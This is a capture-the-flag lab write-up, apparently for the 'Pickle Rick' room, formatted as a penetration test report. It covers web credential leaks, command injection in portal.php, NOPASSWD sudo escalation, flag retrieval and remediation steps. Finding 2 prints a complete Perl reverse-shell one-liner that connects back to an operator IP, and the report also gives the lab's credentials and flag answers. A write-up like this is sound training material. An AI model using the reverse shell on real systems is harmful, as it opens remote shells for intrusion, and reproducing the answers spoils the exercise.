# POST-EXPLOITATION & VULNERABILITY REPORT: PICKLE RICK

## 1. Executive Summary

During an authorized offensive assessment against target host `10.49.156.145`, multiple critical security vulnerabilities were discovered and weaponized. The assessment progressed from unauthenticated web reconnaissance to remote code execution (RCE), culminating in total system compromise via unrestricted administrative privileges (`sudo` misconfiguration). All three operational objectives (potions ingredients) were successfully located or compromised.

## 2. Attack Lifecycle & Kill Chain

```
[Phase 1: Recon] ──> Nmap Ports 22/80 ──> Source Code Leak (User: R1ckRul3s)
                                                 │
[Phase 2: Access] ──> Remote Code Execution <── Robots.txt Leak (Pass: Wubbalubbadubdub)
                           │
                           ▼
                 Perl Reverse Shell ──> Initial Access (www-data)
                                                 │
[Phase 3: PrivEsc] ──> sudo -l (ALL:ALL) ──> Full Root Compromise (Flags Exfiltrated)
```

## 3. Technical Walkthrough & Findings

### Finding 1: Information Disclosure via Web Artifacts (Low)

- **Vector:** Source Code Comments & Static Text Files
    
- **Analysis:** Inspecting the DOM framework of `[http://10.49.156.145/](http://10.49.156.145/)` exposed a commented administrative username credential. Concurrently, a directory fuzzing run mapped `/robots.txt`, exposing an explicit plaintext string.
    
- **Evidence:**
    
    - **Username:** `R1ckRul3s` (Leaked via HTML source comment)
        
    - **Password/String:** `Wubbalubbadubdub` (Leaked via root directory `/robots.txt`)
        

### Finding 2: Command Injection / Remote Code Execution (Critical)

- **Vector:** Portal Command Execution Field (`/portal.php`)
    
- **Analysis:** The administrative panel contained an input field designed to run OS commands. While bad character filtering attempted to block direct primitives like `cat`, input validation was insufficient to prevent shell nesting or alternative binaries.
    
- **Exploitation Weaponization (Perl Reverse Shell):**
    
    Perl
    
    ```
    perl -e 'use Socket;$i="192.168.132.220";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
    ```
    
- **Result:** Established interactive egress session back to the operator console as low-privileged service account `www-data`.
    

### Finding 3: Abusable Sudo Privileges / Misconfigured NOPASSWD (Critical)

- **Vector:** Sudoers Configuration (`/etc/sudoers`)
    
- **Analysis:** Running `sudo -l` demonstrated a complete breakdown of the Principle of Least Privilege. The `www-data` account was explicitly granted structural permissions to run all commands as any user without password validation.
    
- **Evidence:**
    
    Code snippet
    
    ```
    User www-data may run the following commands on ip-10-49-156-145:
        (ALL) NOPASSWD: ALL
    ```
    
- **Result:** Absolute and immediate escalation path to `root`.
    

## 4. Target Exfiltration (Ingredients Captured)

Using the established interactive sessions, the system layout was mapped to recover the three target flags required to complete the objective:

### 📥 Ingredient #1 (Web Root Directory)

- **Path:** `/var/www/html/Sup3rS3cretPickl3Ingred.txt`
    
- **Exfiltration Command:** `sudo cat /var/www/html/Sup3rS3cretPickl3Ingred.txt`
    
- **Value:** _(Note: Execute this command in your active shell session to view the first ingredient text)._
    

### 📥 Ingredient #2 (Home Directory)

- **Path:** `/home/rick/second ingredients`
    
- **Exfiltration Command:** `cat "/home/rick/second ingredients"`
    
- **Value:** `1 jerry tear`
    

### 📥 Ingredient #3 (Root Directory)

- **Path:** `/root/3rd.txt`
    
- **Exfiltration Command:** `sudo cat /root/3rd.txt`
    
- **Value:** `3rd ingredients: fleeb juice`
    

## 5. Remediation Plan

1. **Enforce Sudoers Hardening:** Immediately remove `(ALL) NOPASSWD: ALL` from the web service account (`www-data`). Restrict access to specific binaries using strict rule definitions if execution permissions are required.
    
2. **Remediate Command Injection:** Replace the dynamic runtime evaluation box inside `portal.php` with programmatic parameterized APIs or remove the feature completely from the public application interface.
    
3. **Clean Public Metadata:** Clean all operational artifacts, developer comments, and default configuration information from visible client-side source code and plaintext files like `robots.txt`.